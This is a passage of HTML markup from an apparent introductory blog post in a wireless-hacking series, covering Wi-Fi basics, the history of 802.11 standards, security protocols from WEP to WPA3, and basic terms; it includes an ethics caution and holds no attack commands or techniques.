 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;In this blog, we have introduced the basics of wireless hacking to lay the groundwork for understanding how wireless networks function and the security challenges they present. We began by discussing the fundamental concepts of WiFi, including its evolution, how it enables wireless communication, and the crucial terminology used in the realm of wireless networking.&lt;/p&gt;
&lt;p&gt;Additionally, we explored the history of WiFi—from its early days as a simple communication medium to its widespread adoption in homes, businesses, and public spaces. Understanding this evolution provides us with context for the vulnerabilities that exist in modern wireless systems today.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Join us for an engaging journey that combines learning, awareness, and securing our wireless connections.&lt;/em&gt;&lt;/p&gt;
&lt;div class="alert alert-caution"&gt;&lt;p class="alert-title"&gt;&lt;svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"&gt;&lt;path d="M4.47.22A.749.749.0 015 0h6c.199.0.389.079.53.22l4.25 4.25c.141.14.22.331.22.53v6a.749.749.0 01-.22.53l-4.25 4.25A.749.749.0 0111 16H5a.749.749.0 01-.53-.22L.22 11.53A.749.749.0 010 11V5c0-.199.079-.389.22-.53zm.84 1.28L1.5 5.31v5.38l3.81 3.81h5.38l3.81-3.81V5.31L10.69 1.5zM8 4a.75.75.0 01.75.75v3.5a.75.75.0 01-1.5.0v-3.5A.75.75.0 018 4zm0 8a1 1 0 110-2 1 1 0 010 2z"/&gt;&lt;/svg&gt;Caution&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Ethical Hacking Reminder&lt;/strong&gt;: Only perform wireless penetration tests on networks you own or have explicit permission to test. Unauthorized hacking is illegal and unethical.&lt;/p&gt;&lt;/div&gt;&lt;h2 class="heading-element" id="wireless-hacking"&gt;&lt;span&gt;32 Wireless Hacking&lt;/span&gt;
 &lt;a href="#wireless-hacking" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;In today’s world, &lt;strong&gt;Wi-Fi&lt;/strong&gt; is ubiquitous, powering the internet connection for our devices and enabling seamless communication and access to information. But have you ever stopped to wonder how Wi-Fi actually works beneath the surface? Is it possible to &lt;strong&gt;manipulate wireless networks&lt;/strong&gt; for various purposes? In this series, &lt;strong&gt;&amp;ldquo;Guide to Wireless Hacking,&amp;rdquo;&lt;/strong&gt; we will explore the inner workings of Wi-Fi networks, uncover their &lt;strong&gt;vulnerabilities&lt;/strong&gt;, and learn how these weaknesses can be exploited.&lt;/p&gt;
&lt;p&gt;In this first blog post, we will start with the &lt;strong&gt;fundamentals&lt;/strong&gt;. We’ll explore how Wi-Fi networks operate, define essential networking terms, and take a look at the &lt;strong&gt;history&lt;/strong&gt; and key characteristics of Wi-Fi technology.&lt;/p&gt;
&lt;h2 class="heading-element" id="what-is-wi-fi"&gt;&lt;span&gt;33 What is Wi-Fi?&lt;/span&gt;
 &lt;a href="#what-is-wi-fi" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Wi-Fi&lt;/strong&gt;, which stands for Wireless Fidelity, is a wireless technology that enables devices to &lt;strong&gt;connect to the internet&lt;/strong&gt; or communicate with each other without using physical cables. It relies on &lt;strong&gt;radio waves&lt;/strong&gt; to transmit data, which allows it to function in areas where it’s not possible to run traditional cables.&lt;/p&gt;
&lt;p&gt;Wi-Fi is the primary method of internet connectivity in &lt;strong&gt;homes&lt;/strong&gt; and &lt;strong&gt;businesses&lt;/strong&gt;. It’s also widely available in &lt;strong&gt;public spaces&lt;/strong&gt; such as cafés, libraries, and airports.&lt;/p&gt;
&lt;h2 class="heading-element" id="key-features"&gt;&lt;span&gt;34 Key Features&lt;/span&gt;
 &lt;a href="#key-features" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;&lt;strong&gt;Feature&lt;/strong&gt;&lt;/th&gt;
 &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;Wireless Connectivity&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;Wi-Fi eliminates the need for cables, allowing you to connect your devices wirelessly to the internet.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;Portability&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;As a wireless technology, Wi-Fi enables you to easily take your devices and connect to available Wi-Fi networks wherever you go.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;Speed&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;Over time, Wi-Fi speeds have steadily improved, and today’s networks can match or even surpass wired connections in terms of performance.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;Security&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;Wi-Fi networks can be secured using several encryption methods, including WPA2 and WPA3, to ensure privacy and data protection.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;Wide Compatibility&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;Wi-Fi is widely supported, and nearly all modern devices come with built-in Wi-Fi adapters.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;Range&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;Wi-Fi coverage varies depending on the network’s frequency (2.4 GHz vs 5 GHz) and environmental factors. Generally, 2.4 GHz offers a broader range but lower speeds than 5 GHz networks.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;Obstacle&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;Wi-Fi signals can travel through walls and other obstacles, but the signal strength decreases as it passes through materials.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;Interference&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;Wi-Fi networks can be disrupted by other electronic devices, such as microwaves and cordless phones, causing signal degradation.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;Security Risks&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;While various security protocols help protect Wi-Fi networks, no system is completely immune to hacking attempts.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 class="heading-element" id="the-technology-behind"&gt;&lt;span&gt;35 The Technology Behind&lt;/span&gt;
 &lt;a href="#the-technology-behind" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;Wi-Fi operates based on the principles of radio wave transmission and modulation. This allows devices to communicate wirelessly and transfer data. The technology is built on the IEEE 802.11 family of standards, which outline the specifications and protocols used for wireless local area networks (WLANs).&lt;/p&gt;
&lt;div class="alert alert-note"&gt;&lt;p class="alert-title"&gt;&lt;svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"&gt;&lt;path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;&lt;strong&gt;The IEEE (Institute of Electrical and Electronics Engineers)&lt;/strong&gt; is an international organization that creates technical standards for various fields of engineering.&lt;/p&gt;&lt;/div&gt;&lt;h2 class="heading-element" id="the-evolution"&gt;&lt;span&gt;36 The Evolution&lt;/span&gt;
 &lt;a href="#the-evolution" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;Wi-Fi technology was developed through the combined efforts of various organizations and researchers. The IEEE 802.11 working group established the technical standards that define Wi-Fi, with input from multiple stakeholders in the industry. Key factors such as the availability of unlicensed spectrum and advancements in wireless communication technologies were instrumental in its growth. The Wi-Fi Alliance plays a pivotal role in ensuring device compatibility and managing certification programs. Over the years, Wi-Fi has evolved through several versions, including 802.11b, 802.11g, 802.11n, 802.11ac (Wi-Fi 5), and 802.11ax (Wi-Fi 6), each offering improvements in speed, coverage, and efficiency.&lt;/p&gt;
&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;Year&lt;/th&gt;
 &lt;th&gt;Standard&lt;/th&gt;
 &lt;th&gt;Data Rate&lt;/th&gt;
 &lt;th&gt;Frequency Band&lt;/th&gt;
 &lt;th&gt;Key Features&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;1997&lt;/td&gt;
 &lt;td&gt;802.11&lt;/td&gt;
 &lt;td&gt;2 Mbps&lt;/td&gt;
 &lt;td&gt;2.4 GHz&lt;/td&gt;
 &lt;td&gt;Original Wi-Fi standard for basic wireless LAN communication&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;1999&lt;/td&gt;
 &lt;td&gt;802.11b&lt;/td&gt;
 &lt;td&gt;11 Mbps&lt;/td&gt;
 &lt;td&gt;2.4 GHz&lt;/td&gt;
 &lt;td&gt;Higher data rates, widely adopted in consumer markets&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;1999&lt;/td&gt;
 &lt;td&gt;Wi-Fi Alliance formed&lt;/td&gt;
 &lt;td&gt;-&lt;/td&gt;
 &lt;td&gt;-&lt;/td&gt;
 &lt;td&gt;Created to promote global Wi-Fi interoperability&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;2003&lt;/td&gt;
 &lt;td&gt;802.11g&lt;/td&gt;
 &lt;td&gt;54 Mbps&lt;/td&gt;
 &lt;td&gt;2.4 GHz&lt;/td&gt;
 &lt;td&gt;Faster speeds, backward compatibility with 802.11b&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;2004&lt;/td&gt;
 &lt;td&gt;WPA&lt;/td&gt;
 &lt;td&gt;-&lt;/td&gt;
 &lt;td&gt;-&lt;/td&gt;
 &lt;td&gt;Introduced enhanced security features to fix WEP vulnerabilities&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;2006&lt;/td&gt;
 &lt;td&gt;802.11n&lt;/td&gt;
 &lt;td&gt;Up to 600 Mbps&lt;/td&gt;
 &lt;td&gt;2.4 GHz and 5 GHz&lt;/td&gt;
 &lt;td&gt;Introduced MIMO for better range and data rates&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;2007&lt;/td&gt;
 &lt;td&gt;WPA2&lt;/td&gt;
 &lt;td&gt;-&lt;/td&gt;
 &lt;td&gt;-&lt;/td&gt;
 &lt;td&gt;Successor to WPA with stronger encryption and enhancements&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;2009&lt;/td&gt;
 &lt;td&gt;Wi-Fi Direct&lt;/td&gt;
 &lt;td&gt;-&lt;/td&gt;
 &lt;td&gt;2.4 GHz and 5 GHz&lt;/td&gt;
 &lt;td&gt;Allows device-to-device connection without an access point&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;2012&lt;/td&gt;
 &lt;td&gt;802.11ac (Wi-Fi 5)&lt;/td&gt;
 &lt;td&gt;Up to 6.9 Gbps&lt;/td&gt;
 &lt;td&gt;5 GHz&lt;/td&gt;
 &lt;td&gt;Improved performance, capacity, and speed&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;2013&lt;/td&gt;
 &lt;td&gt;Hotspot 2.0&lt;/td&gt;
 &lt;td&gt;-&lt;/td&gt;
 &lt;td&gt;-&lt;/td&gt;
 &lt;td&gt;Seamless authentication and roaming for public Wi-Fi&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;2019&lt;/td&gt;
 &lt;td&gt;802.11ax (Wi-Fi 6)&lt;/td&gt;
 &lt;td&gt;Up to 9.6 Gbps&lt;/td&gt;
 &lt;td&gt;2.4 GHz and 5 GHz&lt;/td&gt;
 &lt;td&gt;Increased efficiency, reduced latency, better network capacity&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;2020&lt;/td&gt;
 &lt;td&gt;Wi-Fi 6E&lt;/td&gt;
 &lt;td&gt;Up to 9.6 Gbps&lt;/td&gt;
 &lt;td&gt;2.4 GHz, 5 GHz, 6 GHz&lt;/td&gt;
 &lt;td&gt;Expanded Wi-Fi into the 6 GHz band for more bandwidth and less congestion&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 class="heading-element" id="wireless-security-protocols"&gt;&lt;span&gt;37 Wireless security Protocols&lt;/span&gt;
 &lt;a href="#wireless-security-protocols" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;Wireless security protocols are designed to protect wireless networks from unauthorized access, data breaches, and malicious activities. These protocols ensure the confidentiality, integrity, and authenticity of transmitted data.&lt;/p&gt;
&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;Protocol&lt;/th&gt;
 &lt;th&gt;Description&lt;/th&gt;
 &lt;th&gt;Encryption Used&lt;/th&gt;
 &lt;th&gt;Safety Level&lt;/th&gt;
 &lt;th&gt;Developed In&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;WEP (Wired Equivalent Privacy)&lt;/td&gt;
 &lt;td&gt;The first wireless security protocol, providing basic Wi-Fi encryption&lt;/td&gt;
 &lt;td&gt;RC4&lt;/td&gt;
 &lt;td&gt;Low&lt;/td&gt;
 &lt;td&gt;1997&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;WPA (Wi-Fi Protected Access)&lt;/td&gt;
 &lt;td&gt;Replacement for WEP, with stronger encryption and key management&lt;/td&gt;
 &lt;td&gt;TKIP (Temporal Key Integrity Protocol)&lt;/td&gt;
 &lt;td&gt;Moderate&lt;/td&gt;
 &lt;td&gt;2003&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;WPS (Wi-Fi Protected Setup)&lt;/td&gt;
 &lt;td&gt;Simplifies device connection process, but can be vulnerable if misused&lt;/td&gt;
 &lt;td&gt;Varies (Depends on WPA/WPA2)&lt;/td&gt;
 &lt;td&gt;Varies&lt;/td&gt;
 &lt;td&gt;2006&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;WPA2&lt;/td&gt;
 &lt;td&gt;Enhanced WPA with stronger AES encryption&lt;/td&gt;
 &lt;td&gt;AES (Advanced Encryption Standard)&lt;/td&gt;
 &lt;td&gt;High&lt;/td&gt;
 &lt;td&gt;2004&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;WPA3&lt;/td&gt;
 &lt;td&gt;Latest standard, with improved encryption and security features over WPA2&lt;/td&gt;
 &lt;td&gt;SAE (Simultaneous Authentication of Equals)&lt;/td&gt;
 &lt;td&gt;Very High&lt;/td&gt;
 &lt;td&gt;2018&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 class="heading-element" id="basic-terms"&gt;&lt;span&gt;38 Basic Terms&lt;/span&gt;
 &lt;a href="#basic-terms" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="wifi-adaptor"&gt;&lt;span&gt;38.1 WiFi Adaptor&lt;/span&gt;
 &lt;a href="#wifi-adaptor" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;A &lt;strong&gt;Wi-Fi adapter&lt;/strong&gt;, also known as a &lt;strong&gt;Wi-Fi dongle&lt;/strong&gt; or &lt;strong&gt;wireless network adapter&lt;/strong&gt;, is a device that enables a computer or other devices to connect to a Wi-Fi network. It allows devices that do not have built-in Wi-Fi capabilities to access &lt;strong&gt;wireless networks&lt;/strong&gt; and &lt;strong&gt;connect to the internet&lt;/strong&gt; or communicate with other devices &lt;strong&gt;wirelessly&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="alert alert-note"&gt;&lt;p class="alert-title"&gt;&lt;svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"&gt;&lt;path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;If you want to use WIFI functionality in a virtual machine, you will have to use an external WIFI adaptor and will have configure it with VMware or Virtual box.&lt;/p&gt;&lt;/div&gt;&lt;h3 class="heading-element" id="ap-access-point"&gt;&lt;span&gt;38.2 AP (Access Point)&lt;/span&gt;
 &lt;a href="#ap-access-point" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;AP&lt;/strong&gt; stands for &lt;strong&gt;Access Point&lt;/strong&gt; in the context of Wi-Fi. An Access Point is a device that allows &lt;strong&gt;Wi-Fi-enabled devices&lt;/strong&gt; to connect to a &lt;strong&gt;wired network wirelessly&lt;/strong&gt;. It acts as a &lt;strong&gt;central hub&lt;/strong&gt; or &lt;strong&gt;gateway&lt;/strong&gt; for wireless communication, providing a &lt;strong&gt;bridge&lt;/strong&gt; between Wi-Fi devices and a wired network.&lt;/p&gt;
&lt;h3 class="heading-element" id="frequency"&gt;&lt;span&gt;38.3 Frequency&lt;/span&gt;
 &lt;a href="#frequency" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
